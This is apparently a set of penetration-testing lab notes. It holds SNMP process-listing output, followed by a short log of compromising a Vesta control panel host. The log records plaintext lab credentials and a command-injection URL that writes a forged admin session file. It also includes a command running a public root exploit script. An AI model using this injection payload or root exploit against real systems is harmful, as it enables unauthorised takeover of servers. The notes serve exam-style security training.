iso.3.6.1.2.1.25.4.2.1.2.8680 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8681 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8682 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8683 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8684 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8699 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8700 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8701 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8702 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8703 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8704 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8706 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8707 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8708 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8709 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8710 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8711 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8712 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8713 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8715 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8716 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8717 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8718 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8719 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8720 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8721 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8722 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8723 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8724 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8725 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8726 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8727 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8728 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8729 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8730 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8731 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8732 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8733 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8734 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8735 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8759 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8760 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8761 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8762 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8763 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8764 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8765 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8766 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8767 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8768 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8769 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8770 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.8771 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.9069 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.9093 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.9117 = STRING: "apache2"
iso.3.6.1.2.1.25.4.2.1.2.9521 = STRING: "kworker/0:0"
iso.3.6.1.2.1.25.4.2.1.2.9908 = STRING: "exim4"
iso.3.6.1.2.1.25.4.2.1.2.10268 = STRING: "kworker/0:1"
```
# COAS:
# LOG:
- Got access to https://oscp.exam:8083/list/user/ as Jack:3PUKsX98BMupBiCf
```
https://192.168.195.156:8083/list/backup/index.php?backup=123%27%20||%20  echo 'V0VCX1NZU1RFTXxzOjc6ImFwYWNoZTIiO1dFQl9SR1JPVVBTfHM6ODoid3d3LWRhdGEiO1dFQl9QT1JUfHM6NDoiODA4MCI7V0VCX1NTTHxzOjc6Im1vZF9zc2wiO1dFQl9TU0xfUE9SVHxzOjQ6Ijg0NDMiO1BST1hZX1NZU1RFTXxzOjU6Im5naW54IjtQUk9YWV9QT1JUfHM6MjoiODAiO1BST1hZX1NTTF9QT1JUfHM6MzoiNDQzIjtGVFBfU1lTVEVNfHM6NjoidnNmdHBkIjtNQUlMX1NZU1RFTXxzOjU6ImV4aW00IjtJTUFQX1NZU1RFTXxzOjc6ImRvdmVjb3QiO0FOVElWSVJVU19TWVNURU18czowOiIiO0FOVElTUEFNX1NZU1RFTXxzOjA6IiI7REJfU1lTVEVNfHM6NToibXlzcWwiO0ROU19TWVNURU18czo1OiJiaW5kOSI7U1RBVFNfU1lTVEVNfHM6MTc6IndlYmFsaXplcixhd3N0YXRzIjtCQUNLVVBfU1lTVEVNfHM6NToibG9jYWwiO0NST05fU1lTVEVNfHM6NDoiY3JvbiI7RElTS19RVU9UQXxzOjI6Im5vIjtGSVJFV0FMTF9TWVNURU18czo4OiJpcHRhYmxlcyI7RklSRVdBTExfRVhURU5TSU9OfHM6ODoiZmFpbDJiYW4iO1JFUE9TSVRPUll8czo1OiJjbW1udCI7VkVSU0lPTnxzOjU6IjAuOS44IjtMQU5HVUFHRXxzOjI6ImVuIjtsYW5ndWFnZXxzOjI6ImVuIjt1c2VyfHM6NToiYWRtaW4iO2JhY2t8czoxMToiL2xpc3QvdXNlci8iOw==' | base64 --decode > /tmp/sess_12345%20||%20echo%20\
```
- Logged into FTP with Jack:3PUKsX98BMupBiCf
- Used this repo to get root: https://github.com/rekter0/exploits
```
python3 vestaROOT.py https://192.168.195.156:8083/ Jack 3PUKsX98BMupBiCf
``` 
